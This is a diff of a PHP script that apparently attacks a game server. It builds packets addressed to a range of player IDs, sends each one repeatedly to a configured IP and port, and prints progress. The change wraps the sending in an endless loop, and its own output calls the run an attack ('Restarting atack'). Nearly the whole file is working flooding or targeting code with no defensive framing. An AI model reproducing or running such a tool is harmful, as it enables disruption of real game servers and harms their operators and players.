@@ -1,7 +1,7 @@
 <?php 
 // Silencioso
 require ("class/_getBytes.php");
-require("../_public/class/utils.php");
+require("../_public/utils.php");
 $config = parse_ini_file("config.ini", true);
 $uleep = (int)$config['sleepTime'] < 0 ? 0 : (int)$config['sleepTime']*1000;
 
@@ -37,32 +37,40 @@ $write = new SendPacket();
 $write->addr = $config['ip'];
 $write->port = $config['port'];
 
-for ($pId=$config['PlayerId_Start']; $pId <= $config['PlayerId_End']; $pId++) {
- 	$write->int16(13);
-	$write->int64($pId); #pId
-	$write->int8(1); #type13 0 | outher
+while(true){
 
-	$write->uInt16(count($bytes->bytes)); # packetSize
-	{
-		
-		foreach ($bytes->bytes as $value) {
-			$write->addByte($value);
+	for ($pId=$config['PlayerId_Start']; $pId <= $config['PlayerId_End']; $pId++) {
+	 	$write->int16(13);
+		$write->int64($pId); #pId
+		$write->int8(1); #type13 0 | outher
+
+		$write->uInt16(count($bytes->bytes)); # packetSize
+		{
+			
+			foreach ($bytes->bytes as $value) {
+				$write->addByte($value);
+			}
 		}
+
+		for ($i=1; $i <= $config['packetsPerID']; $i++) { 
+			$write->Send();
+		}
+		
+
+		if($config['debug'])
+			echo "[".number_format(percent($pId,$config['PlayerId_End']),1)."%]\tPlayerId $pId - ".$config['PlayerId_Start']."/".$pId."\n";
+		else
+			echo ".";
+
+		$write->clear();
+		usleep($uleep);
+		
 	}
-
-	for ($i=1; $i <= $config['packetsPerID']; $i++) { 
-		$write->Send();
+	if ((bool)$config['loop']) {
+		echo "[Loop]\t!!!Restarting atack!!!". PHP_EOL;
+	}else{
+		break;
 	}
-	
-
-	if($config['debug'])
-		echo "[".number_format(percent($pId,$config['PlayerId_End']),1)."%]\tPlayerId $pId - ".$config['PlayerId_Start']."/".$pId."\n";
-	else
-		echo ".";
-
-	$write->clear();
-	usleep($uleep);
-	
+	sleep(1);
 }
-
 ?>
